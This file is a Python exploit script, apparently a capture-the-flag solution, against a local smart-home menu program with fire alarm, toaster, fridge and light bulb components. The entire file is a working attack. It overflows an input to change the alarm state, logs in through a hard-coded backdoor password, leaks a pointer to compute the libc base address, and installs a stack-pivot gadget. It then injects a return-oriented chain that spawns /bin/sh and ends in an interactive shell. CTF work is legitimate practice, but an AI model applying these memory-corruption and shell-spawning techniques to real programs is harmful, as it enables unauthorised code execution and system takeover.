import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

p = interact.Process()

# Change fireAlarm.alarm
print('Hacking fire alarm...')
data = p.readuntil('Enter Choice:')
p.sendline('4')
data = p.readuntil('[Y/n]')
p.sendline('Y')
data = p.readuntil('Enter phone number to test:')
p.sendline('a'*8 + '\x05')

# Burn the toast
print('Burning toast...')
data = p.readuntil('Enter Choice:')
p.sendline('2')
data = p.readuntil('Enter Choice:')
p.sendline('2')
data = p.readuntil('Enter temperature:')
p.sendline('370')
data = p.readuntil('Enter Choice:')
p.sendline('3')

# Login to backdoor
print('Logging into fridge...')
data = p.readuntil('{PASSWORD REQUIRED TO CONTINUE}')
p.sendline('ZfaADAABBA')

# Turn off fridge
print('Turning off fridge...')
data = p.readuntil('Melt just the icecream')
p.sendline('0')
data = p.readuntil('Enter Choice:')
p.sendline('4')

# Turn on light bulb
print('Turning on light bulb...')
data = p.readuntil('Enter Choice:')
p.sendline('1')
data = p.readuntil('Enter Choice:')
p.sendline('4')

# Leak lightBulb.toggle
print('Leaking light bulb...')
data = p.readuntil('Enter Choice:')
p.sendline('2')
data = p.readuntil('Enter Choice:')
p.sendline('2')
data = p.readuntil('Enter favorite number:')
p.sendline('10')
data = p.readuntil('Enter Choice:')
p.sendline('1')
data = p.readuntil('Color is #')
data = p.readuntil('\n')

alarmPassAddr = hex(int(data, 16) - 430)[2:]

# Point lightBulb.toggle to printAlarmPassword()
print('Getting alarm password...')
data = p.readuntil('Enter Choice:')
p.sendline('3')
data = p.readuntil('Enter favorite number:')
p.sendline('10')
data = p.readuntil('Enter color as hex:')
p.sendline(alarmPassAddr)
data = p.readuntil('Enter Choice:')
p.sendline('4')
data = p.readuntil('Password:')
data = p.readuntil('\'----')
password = int(data[12:29], 16)
data = p.readuntil('Enter Choice:')
p.sendline('5')

libc_addr = password - 237616
bin_sh = libc_addr + 0x18cd57

# Generate payload
gadgets = [
    libc_addr + 0x21102, bin_sh, # mov rdi, bin_sh
    libc_addr + 0x33544, 0x3b,   # mov rax, 0x3b
    libc_addr + 0x01b92, 0x0,    # mov rdx, 0x0
    libc_addr + 0xe8c0e,         # xor esi, esi
    libc_addr + 0xbc375,         # syscall
]
payload = "4"+('\x00'*15)
for gadget in gadgets:
    payload += p64(gadget)

# Disable alarm
print('Disabling alarm...')
data = p.readuntil('Enter Choice:')
p.sendline('5')
data = p.readuntil('CONTINUE:')
p.sendline(password)
data = p.readuntil('Enter choice:')
p.sendline('1')
data = p.readuntil('Enter choice:')
p.sendline('3')

# Insert pivot gadget
print('Inserting pivot gadget...')
pivot = hex(libc_addr + 0x34ad2)[2:-1] # add rsp, 0x28
data = p.readuntil('Enter Choice:')
p.sendline('1')
data = p.readuntil('Enter Choice:')
p.sendline('3')
data = p.readuntil('Enter favorite number:')
p.sendline('10')
data = p.readuntil('Enter color as hex:')
p.sendline(pivot[-8:])
data = p.readuntil('Enter Choice:')
p.sendline('3')
data = p.readuntil('Enter favorite number:')
p.sendline('11')
data = p.readuntil('Enter color as hex:')
p.sendline(pivot[:-8])

# Inject payload
print('Injecting payload...')
data = p.readuntil('Enter Choice:')
p.sendline(payload)

p.interactive()
